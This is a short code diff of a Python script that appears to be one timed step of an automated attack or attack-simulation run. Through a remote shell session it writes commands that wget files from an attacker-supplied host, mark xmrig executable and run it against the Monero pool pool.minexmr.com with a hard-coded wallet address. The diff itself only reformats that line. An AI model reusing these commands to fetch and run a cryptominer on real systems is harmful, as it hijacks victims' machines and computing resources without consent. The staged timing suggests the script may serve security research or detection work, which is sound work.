@@ -33,7 +33,9 @@ def main(argv):
     shell.write('wget --no-check-certificate http://{0}/downloads/config.json'.format(my_ip))
     shell.write('wget --no-check-certificate http://{0}/downloads/SHA256SUMS'.format(my_ip))
     shell.write('chmod +x ./xmrig')
-    shell.write('timeout 60s ./xmrig --donate-level 4 -o pool.minexmr.com:443 -u 44Hp1de8CprPz2K74U5ch4VssxZQUDjVrZWtgRScHZo83mb6D6cHfpLZg4zhaT1BvzJe5jdbPLHzqHp4jrx1hP6UHFCgWhN -k --tls')
+    shell.write('timeout 60s ./xmrig --donate-level 4 -o pool.minexmr.com:443 -u '
+                '44Hp1de8CprPz2K74U5ch4VssxZQUDjVrZWtgRScHZo83mb6D6cHfpLZg4zhaT1BvzJe5jdbPLHzqHp4jrx1hP6UHFCgWhN '
+                '-k --tls')
 
     while client.jobs.list:
         time.sleep(1)
@@ -42,5 +44,6 @@ def main(argv):
     output_time_file = 'time_step_7_end.txt'
     record_timestamp(folder, output_time_file)
     time.sleep(2)
+
 
 main(sys.argv)
